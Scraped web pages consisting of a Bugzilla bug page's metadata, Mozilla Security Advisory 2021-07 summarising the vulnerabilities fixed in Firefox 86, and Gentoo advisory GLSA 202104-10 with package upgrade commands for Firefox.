Flags: needinfo?(s.kaspari)

|  | [Chris Peterson [:cpeterson]](/user_profile?user_id=430528) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a57855439_430528)• 2 years ago |

Component: Security: Android → GeneralOS: Unspecified → Android

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a107402214_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1684761&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [gnehsoah](/user_profile?user_id=586010)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_833258de_20250115_081456.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2021-07

## Security Vulnerabilities fixed in Firefox 86

Announced
February 23, 2021
Impact
high
Products
Firefox
Fixed in

* Firefox 86

#### [#CVE-2021-23969: Content Security Policy violation report could have contained the destination of a redirect](#CVE-2021-23969)

Reporter
Masato Kinugawa
Impact
high
##### Description

As specified in the W3C Content Security Policy draft, when creating a violation report, "User agents need to ensure that the source file is the URL requested by the page, pre-redirects. If that’s not possible, user agents need to strip the URL down to an origin to avoid unintentional leakage." Under certain types of redirects, Firefox incorrectly set the source file to be the destination of the redirects. This was fixed to be the redirect destination's origin.

##### References

* [Bug 1542194](https://bugzilla.mozilla.org/show_bug.cgi?id=1542194)

#### [#CVE-2021-23970: Multithreaded WASM triggered assertions validating separation of script domains](#CVE-2021-23970)

Reporter
J. Ryan Stinnett
Impact
high
##### Description

Context-specific code was included in a shared jump table; resulting in assertions being triggered in multithreaded wasm code.

##### References

* [Bug 1681724](https://bugzilla.mozilla.org/show_bug.cgi?id=1681724)

#### [#CVE-2021-23968: Content Security Policy violation report could have contained the destination of a redirect](#CVE-2021-23968)

Reporter
Ademar Nowasky Junior
Impact
high
##### Description

If Content Security Policy blocked frame navigation, the full destination of a redirect served in the frame was reported in the violation report; as opposed to the original frame URI. This could be used to leak sensitive information contained in such URIs.

##### References

* [Bug 1687342](https://bugzilla.mozilla.org/show_bug.cgi?id=1687342)

#### [#CVE-2021-23974: noscript elements could have led to an HTML Sanitizer bypass](#CVE-2021-23974)

Reporter
Masato Kinugawa and Michał Bentkowski
Impact
moderate
##### Description

The DOMParser API did not properly process `<noscript>` elements for escaping. This could be used as an mXSS vector to bypass an HTML Sanitizer.

##### References

* [Bug 1528997, 1683627](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1528997%2C1683627)

#### [#CVE-2021-23971: A website's Referrer-Policy could have been be overridden, potentially resulting in the full URL being sent as a Referrer](#CVE-2021-23971)

Reporter
Luca Moretto
Impact
moderate
##### Description

When processing a redirect with a conflicting Referrer-Policy, Firefox would have adopted the redirect's Referrer-Policy. This would have potentially resulted in more information than intended by the original origin being provided to the destination of the redirect.

##### References

* [Bug 1678545](https://bugzilla.mozilla.org/show_bug.cgi?id=1678545)

#### [#CVE-2021-23976: Local spoofing of web manifests for arbitrary pages in Firefox for Android](#CVE-2021-23976)

Reporter
Muneaki Nishimura
Impact
moderate
##### Description

When accepting a malicious intent from other installed apps, Firefox for Android accepted manifests from arbitrary file paths and allowed declaring webapp manifests for other origins. This could be used to gain fullscreen access for UI spoofing and could also lead to cross-origin attacks on targeted websites.
*Note: This issue is a different issue from CVE-2020-26954 and only affected Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1684627](https://bugzilla.mozilla.org/show_bug.cgi?id=1684627)

#### [#CVE-2021-23977: Malicious application could read sensitive data from Firefox for Android's application directories](#CVE-2021-23977)

Reporter
fatal0
Impact
moderate
##### Description

Firefox for Android suffered from a time-of-check-time-of-use vulnerability that allowed a malicious application to read sensitive data from application directories.
*Note: This issue is only affected Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1684761](https://bugzilla.mozilla.org/show_bug.cgi?id=1684761)

#### [#CVE-2021-23972: HTTP Auth phishing warning was omitted when a redirect is cached](#CVE-2021-23972)

Reporter
Vijay Tikudave
Impact
low
##### Description

One phishing tactic on the web is to provide a link with HTTP Auth. For example `https://www.phishingtarget.com@evil.com`. To mitigate this type of attack, Firefox will display a warning dialog; however, this warning dialog would not have been displayed if evil.com used a redirect that was cached by the browser.

##### References

* [Bug 1683536](https://bugzilla.mozilla.org/show_bug.cgi?id=1683536)

#### [#CVE-2021-23975: about:memory Measure function caused an incorrect pointer operation](#CVE-2021-23975)

Reporter
Brian Carpenter of Geeknik Labs & Farm
Impact
low
##### Description

The developer page about:memory has a Measure function for exploring what object types the browser has allocated and their sizes. When this function was invoked we incorrectly called the sizeof function, instead of using the API method that checks for invalid pointers.

##### References

* [Bug 1685145](https://bugzilla.mozilla.org/show_bug.cgi?id=1685145)

#### [#CVE-2021-23973: MediaError message property could have leaked information about cross-origin resources](#CVE-2021-23973)

Reporter
Andreas Pehrson
Impact
low
##### Description

When trying to load a cross-origin resource in an audio/video context a decoding error may have resulted, and the content of that error may have revealed information about the resource.

##### References

* [Bug 1690976](https://bugzilla.mozilla.org/show_bug.cgi?id=1690976)

#### [#CVE-2021-23978: Memory safety bugs fixed in Firefox 86 and Firefox ESR 78.8](#CVE-2021-23978)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Alexis Beingessner, Tyson Smith, Nika Layzell, and Mats Palmgren reported memory safety bugs present in Firefox 85 and Firefox ESR 78.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 86 and Firefox ESR 78.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=786797%2C1682928%2C1687391%2C1687597)

#### [#CVE-2021-23979: Memory safety bugs fixed in Firefox 86](#CVE-2021-23979)

Reporter
Mozilla developers
Impact
high
##### Description

Mozilla developers Tyson Smith, Lars T Hansen, Valentin Gosu, and Sebastian Hengst reported memory safety bugs present in Firefox 85. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 86](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1663222%2C1666607%2C1672120%2C1678463%2C1678927%2C1679560%2C1681297%2C1681684%2C1683490%2C1684377%2C1684902)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from security.gentoo.org_bed394fc_20250115_081455.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Firefox: Multiple vulnerabilities — GLSA **202104-10**

Multiple vulnerabilities have been found in Mozilla Firefox, the
worst of which could result in the arbitrary execution of code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **88.0** |
| Unaffected versions | >= **78.10.0**>= **88.0** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **88.0** |
| Unaffected versions | >= **78.10.0**>= **88.0** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla
project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please
review the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox ESR users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-78.10.0"

```

All Mozilla Firefox ESR binary users should upgrade to the latest
version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-78.10.0"

```

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-88.0"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-88.0"

```
### References

* [CVE-2021-23961](https://nvd.nist.gov/vuln/detail/CVE-2021-23961)
* [CVE-2021-23968](https://nvd.nist.gov/vuln/detail/CVE-2021-23968)
* [CVE-2021-23969](https://nvd.nist.gov/vuln/detail/CVE-2021-23969)
* [CVE-2021-23970](https://nvd.nist.gov/vuln/detail/CVE-2021-23970)
* [CVE-2021-23971](https://nvd.nist.gov/vuln/detail/CVE-2021-23971)
* [CVE-2021-23972](https://nvd.nist.gov/vuln/detail/CVE-2021-23972)
* [CVE-2021-23973](https://nvd.nist.gov/vuln/detail/CVE-2021-23973)
* [CVE-2021-23974](https://nvd.nist.gov/vuln/detail/CVE-2021-23974)
* [CVE-2021-23975](https://nvd.nist.gov/vuln/detail/CVE-2021-23975)
* [CVE-2021-23976](https://nvd.nist.gov/vuln/detail/CVE-2021-23976)
* [CVE-2021-23977](https://nvd.nist.gov/vuln/detail/CVE-2021-23977)
* [CVE-2021-23978](https://nvd.nist.gov/vuln/detail/CVE-2021-23978)
* [CVE-2021-23981](https://nvd.nist.gov/vuln/detail/CVE-2021-23981)
* [CVE-2021-23982](https://nvd.nist.gov/vuln/detail/CVE-2021-23982)
* [CVE-2021-23983](https://nvd.nist.gov/vuln/detail/CVE-2021-23983)
* [CVE-2021-23984](https://nvd.nist.gov/vuln/detail/CVE-2021-23984)
* [CVE-2021-23985](https://nvd.nist.gov/vuln/detail/CVE-2021-23985)
* [CVE-2021-23986](https://nvd.nist.gov/vuln/detail/CVE-2021-23986)
* [CVE-2021-23987](https://nvd.nist.gov/vuln/detail/CVE-2021-23987)
* [CVE-2021-23988](https://nvd.nist.gov/vuln/detail/CVE-2021-23988)
* [CVE-2021-23994](https://nvd.nist.gov/vuln/detail/CVE-2021-23994)
* [CVE-2021-23995](https://nvd.nist.gov/vuln/detail/CVE-2021-23995)
* [CVE-2021-23998](https://nvd.nist.gov/vuln/detail/CVE-2021-23998)
* [CVE-2021-23999](https://nvd.nist.gov/vuln/detail/CVE-2021-23999)
* [CVE-2021-24002](https://nvd.nist.gov/vuln/detail/CVE-2021-24002)
* [CVE-2021-29945](https://nvd.nist.gov/vuln/detail/CVE-2021-29945)
* [CVE-2021-29946](https://nvd.nist.gov/vuln/detail/CVE-2021-29946)
* [MFSA-2021-08](https://www.mozilla.org/en-US/security/advisories/mfsa2021-08/)
* [MFSA-2021-11](https://www.mozilla.org/en-US/security/advisories/mfsa2021-11/)
* [MFSA-2021-15](https://www.mozilla.org/en-US/security/advisories/mfsa2021-15/)

**Release date**

April 30, 2021

**Latest revision**

April 30, 2021: 1

**Severity**

normal

**Exploitable**

local, remote

**Bugzilla entries**

* [772305](https://bugs.gentoo.org/show_bug.cgi?id=772305)
* [778269](https://bugs.gentoo.org/show_bug.cgi?id=778269)
* [784572](https://bugs.gentoo.org/show_bug.cgi?id=784572)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**


